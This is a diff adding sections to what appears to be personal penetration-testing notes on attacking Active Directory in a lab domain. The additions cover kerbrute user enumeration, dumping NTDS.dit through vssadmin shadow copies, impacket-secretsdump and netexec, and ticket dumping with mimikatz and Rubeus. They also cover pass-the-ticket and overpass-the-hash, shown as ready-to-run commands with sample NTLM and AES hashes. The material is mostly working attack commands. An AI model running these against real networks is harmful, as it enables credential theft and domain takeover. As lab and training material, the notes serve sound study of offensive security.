@@ -374,6 +374,68 @@ john unshadowed.hashes --show
 
 <figure><img src="../.gitbook/assets/image (1691).png" alt=""><figcaption></figcaption></figure>
 
+## Attacking AD&#x20;
+
+{% hint style="info" %}
+_In Active Directory we can't simply use nxc and find valid user id and passwords as there are a lot of group policies and restriction that stops us doing brute forcing stuffs. So we need to create a custom list using username-anarchy tool based on names and identify usernames from active directory using kerbrute._&#x20;
+{% endhint %}
+
+{% code overflow="wrap" %}
+```bash
+./username-anarchy -i names.txt
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1730).png" alt=""><figcaption></figcaption></figure>
+
+{% code overflow="wrap" %}
+```bash
+/kerbrute_linux_amd64 userenum --dc 192.168.16.111 --domain nexploit.local ../usernames.txt
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1731).png" alt=""><figcaption></figcaption></figure>
+
+## Dumping NTDS.dit
+
+`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a forest. The `.dit` stands for directory information tree. This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information.
+
+### Using vssadmin
+
+We can use `vssadmin` to create a Volume shadow copy (VSS) of the `C:` drive or any drive that we want.&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+vssadmin CREATE SHADOW /For=C:
+
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\users\Administrator\Desktop\NTDS.dit
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1732).png" alt=""><figcaption></figcaption></figure>
+
+#### Dumping with impacket-secretsdump&#x20;
+
+{% code overflow="wrap" %}
+```bash
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1733).png" alt=""><figcaption></figcaption></figure>
+
+### Using netexec&#x20;
+
+{% code overflow="wrap" %}
+```bash
+netexec smb 192.168.16.111 -u Administrator -p 'P@$$w0rd' -M ntdsutil
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1734).png" alt=""><figcaption></figcaption></figure>
+
+
+
 ## Pass-The-Hash (PtH)
 
 ### Using Mimikatz&#x20;
@@ -516,3 +578,118 @@ xfreerdp /v:192.168.16.132 /u:arjun /pth:8846f7eaee8fb117ad06bdd830b7586c
 UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
 
 </details>
+
+## Dump Tickets
+
+We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)` attack. It can be:
+
+* Service Ticket (TGS) to allow access to a particular resource.
+* Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
+
+{% hint style="info" %}
+_On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process._
+
+* _That's why dumping with normal cmd gives your ticket only._&#x20;
+* _Dumping with administrator privilege gives all tickets from the machine._&#x20;
+{% endhint %}
+
+Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
+
+### Using mimikatz&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+mimikatz.exe 
+privilege::debug 
+sekurlsa::tickets /export
+exit
+dir *.kirbi
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1736).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+**Observation:**&#x20;
+
+1. _The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory._&#x20;
+2. _User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`._
+3. _If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account. Other tickets are TGS ticket whereas ticket with `krbtgt` is TGT ticket for that account._&#x20;
+{% endhint %}
+
+### Using Rubeus&#x20;
+
+* `nowrap` is written for easier copy-paste.
+
+{% code overflow="wrap" %}
+```cmd
+Rubeus.exe dump /nowrap 
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1737).png" alt=""><figcaption></figcaption></figure>
+
+## Pass-the-Ticket (PtT)
+
+### Using Rubeus&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+Rubeus.exe asktgt /domain:nexploit.local /user:romario /rc4:4ba55e3181a42ccd8610dadd0bfa1df9 /ptt
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1741).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="danger" %}
+Danger. still working will get on that.&#x20;
+{% endhint %}
+
+## OverPass the Hash (Pass the Key)
+
+&#x20;The `Pass the Key` aka. `OverPass the Hash` approach converts a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a full `Ticket Granting Ticket` (`TGT`).&#x20;
+
+### Mimikatz - Extract kerberos keys&#x20;
+
+To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`.
+
+{% code overflow="wrap" %}
+```cmd
+mimikatz.exe 
+privilege::debug
+sekurlsa::ekeys
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1738).png" alt=""><figcaption></figcaption></figure>
+
+As we're using the most recent version of Windows server we are not able to get the `RC4_HMAC` keys. But if we get that we can OverPass the Hash using the below tools.&#x20;
+
+### OverPass the Hash (Mimikatz)
+
+{% code overflow="wrap" %}
+```cmd
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /domain:nexploit.local /user:romario /ntlm:4ba55e3181a42ccd8610dadd0bfa1df9
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1739).png" alt=""><figcaption></figcaption></figure>
+
+### OverPass the Hash (Rubeus)
+
+{% hint style="info" %}
+_It doesn't require administrator privileges for overpassing the hash._&#x20;
+{% endhint %}
+
+To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`.
+
+{% code overflow="wrap" %}
+```cmd
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1740).png" alt=""><figcaption></figcaption></figure>
+
